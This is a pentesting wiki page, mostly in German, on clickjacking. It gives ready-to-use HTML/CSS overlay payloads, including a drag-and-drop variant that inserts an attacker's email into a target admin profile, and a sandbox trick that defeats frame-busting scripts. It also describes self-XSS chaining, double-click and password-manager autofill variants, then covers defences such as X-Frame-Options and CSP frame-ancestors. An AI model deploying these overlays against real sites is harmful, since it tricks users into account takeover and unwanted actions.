# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** dazu **getäuscht**, auf ein **Element** einer Webseite zu **klicken**, das entweder **unsichtbar** ist oder als ein anderes Element getarnt wird. Diese Manipulation kann zu unbeabsichtigten Folgen für den Benutzer führen, wie dem Herunterladen von Malware, der Weiterleitung auf bösartige Webseiten, der Preisgabe von Zugangsdaten oder sensiblen Informationen, Geldüberweisungen oder dem Online-Kauf von Produkten.

### Trick: Formulare vorbefüllen

Manchmal ist es möglich, die **Werte der Felder eines Formulars per GET-Parameter beim Laden einer Seite zu füllen**. Ein Angreifer kann dieses Verhalten ausnutzen, um ein Formular mit beliebigen Daten vorab auszufüllen und das Clickjacking-Payload zu platzieren, sodass der Benutzer den Button Submit drückt.

### Formular mit Drag\&Drop füllen

Wenn du den Benutzer dazu bringen musst, ein **Formular auszufüllen**, aber ihn nicht direkt bitten willst, bestimmte Informationen einzugeben (wie die E-Mail oder ein spezifisches Passwort, das du kennst), kannst du ihn einfach bitten, etwas per **Drag\&Drop** zu verschieben, das deine kontrollierten Daten einträgt, wie in [**diesem Beispiel**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Mehrstufiger Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click-Payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn Sie eine **XSS attack that requires a user to click** auf ein Element identifiziert haben, um die XSS zu **triggern**, und die Seite für **Clickjacking** verwundbar ist, können Sie dies ausnutzen, um den Benutzer dazu zu bringen, auf den Button/Link zu klicken.\  
Beispiel:\  
Sie haben eine **self XSS** in einigen privaten Account-Details gefunden (Details, die **nur Sie setzen und lesen** können). Die Seite mit dem **Formular**, um diese Details zu setzen, ist **vulnerable** gegenüber **Clickjacking** und Sie können das **Formular** mit GET-Parametern **prepopulate**.\
Ein Angreifer könnte eine **Clickjacking**-Attacke auf diese Seite vorbereiten, das **Formular prepopulating** mit dem **XSS payload** füllen und den **User** dazu **tricksen**, das **Formular zu Submit**. Wenn das Formular abgesendet wird und die Werte geändert sind, **führt der User die XSS aus**.

### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Diese Technik erlaubt es, den Benutzer dazu zu bringen, an einer Stelle auf der Opferseite zu klicken und damit alle Schutzmechanismen gegen Clickjacking zu umgehen. Der Angreifer muss also **sensitive Aktionen** finden, die mit nur einem Klick ausgeführt werden können, z. B. OAuth-Eingabeaufforderungen zum Akzeptieren von **permissions**.

### Browser-Erweiterungen: DOM-based autofill clickjacking

Abgesehen vom Einbetten (iframes) von Opferseiten können Angreifer UI-Elemente von Browser extensions anvisieren, die in die Seite injiziert werden. Password managers rendern autofill-Dropdowns in der Nähe fokussierter Inputs; durch Fokussieren eines vom Angreifer kontrollierten Feldes und das Verbergen/Überdecken des Dropdowns der Erweiterung (Opacity/Overlay/Top-Layer-Tricks) kann ein erzwungener User-Klick ein gespeichertes Element auswählen und sensitive Daten in angreifer-kontrollierte Inputs füllen. Diese Variante erfordert keine iframe-Exposition und funktioniert vollständig über DOM/CSS-Manipulation.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategien zur Minderung von Clickjacking

### Clientseitige Abwehrmaßnahmen

Skripte, die auf der Client-Seite ausgeführt werden, können Maßnahmen ergreifen, um Clickjacking zu verhindern:

- Sicherstellen, dass das Anwendungsfenster das Haupt- oder Top-Fenster ist.
- Alle Frames sichtbar machen.
- Klicks auf unsichtbare Frames verhindern.
- Potenzielle Clickjacking-Versuche erkennen und Benutzer warnen.

Diese frame-busting Scripts können jedoch umgangen werden:

- **Browsers' Security Settings:** Einige Browser könnten diese Skripte basierend auf ihren Sicherheitseinstellungen oder fehlender JavaScript-Unterstützung blockieren.
- **HTML5 iframe sandbox Attribute:** Ein Angreifer kann frame buster Skripte neutralisieren, indem er das sandbox-Attribut mit den Werten allow-forms oder allow-scripts ohne allow-top-navigation setzt. Dadurch kann das iframe nicht überprüfen, ob es das Top-Window ist, z. B.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Die Werte allow-forms und allow-scripts erlauben Aktionen innerhalb des <iframe>, während die Top-Level-Navigation deaktiviert wird. Um die beabsichtigte Funktionalität der angegriffenen Site sicherzustellen, können je nach Angriffstyp zusätzliche Berechtigungen wie allow-same-origin und allow-modals erforderlich sein. Meldungen in der Browser-Konsole können Hinweise darauf geben, welche Berechtigungen erlaubt werden müssen.

### Server-Side Defenses

#### X-Frame-Options

Der **X-Frame-Options HTTP response header** informiert Browser darüber, ob das Rendern einer Seite in einem <frame> oder <iframe> legitim ist und hilft so, Clickjacking zu verhindern:

- X-Frame-Options: deny - Keine Domain kann den Inhalt fram(en).
- X-Frame-Options: sameorigin - Nur die aktuelle Site kann den Inhalt fram(en).
- X-Frame-Options: allow-from https://trusted.com - Nur die angegebene 'uri' darf die Seite fram(en).
- Hinweis zu den Einschränkungen: Wenn der Browser diese Direktive nicht unterstützt, funktioniert sie möglicherweise nicht. Manche Browser bevorzugen die CSP frame-ancestors Direktive.

#### Content Security Policy (CSP) frame-ancestors directive

Die **frame-ancestors directive in CSP** ist die empfohlene Methode zum Schutz vor Clickjacking:

- frame-ancestors 'none' - Ähnlich wie X-Frame-Options: deny.
- frame-ancestors 'self' - Ähnlich wie X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Ähnlich wie X-Frame-Options: allow-from.

Zum Beispiel erlaubt die folgende CSP nur das Framing von derselben Domain:

Content-Security-Policy: frame-ancestors 'self';

Weitere Details und komplexe Beispiele finden sich in der [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und in der [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** ist eine Sicherheitsmaßnahme, die dabei hilft, Clickjacking und andere code injection attacks zu verhindern, indem sie festlegt, welche Quellen der Browser zum Laden von Inhalten zulassen soll.

#### frame-src Directive

- Definiert gültige Quellen für Frames.
- Spezifischer als die default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames von derselben Herkunft (self) und https://trusted-website.com.

#### child-src Direktive

- Eingeführt in CSP Level 2, um gültige Quellen für web workers und frames festzulegen.
- Fungiert als Fallback für frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt frames und workers von derselben Origin (self) und https://trusted-website.com.

**Usage Notes:**

- Deprecation: child-src wird zugunsten von frame-src und worker-src schrittweise eingestellt.
- Fallback Behavior: Wenn frame-src fehlt, wird child-src als Fallback für frames verwendet. Fehlen beide, kommt default-src zur Anwendung.
- Strict Source Definition: Nur vertrauenswürdige Quellen in die Direktiven aufnehmen, um Ausnutzung zu verhindern.

#### JavaScript Frame-Breaking Scripts

Obwohl nicht vollständig narrensicher, können JavaScript-based frame-busting scripts verwendet werden, um zu verhindern, dass eine Webseite in einem frame angezeigt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Verwendung von Anti-CSRF-Tokens

- **Token-Validierung:** Verwende Anti-CSRF-Tokens in Webanwendungen, um sicherzustellen, dass zustandsändernde Anfragen absichtlich vom Benutzer ausgeführt werden und nicht über eine Clickjacked page.

## Referenzen

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
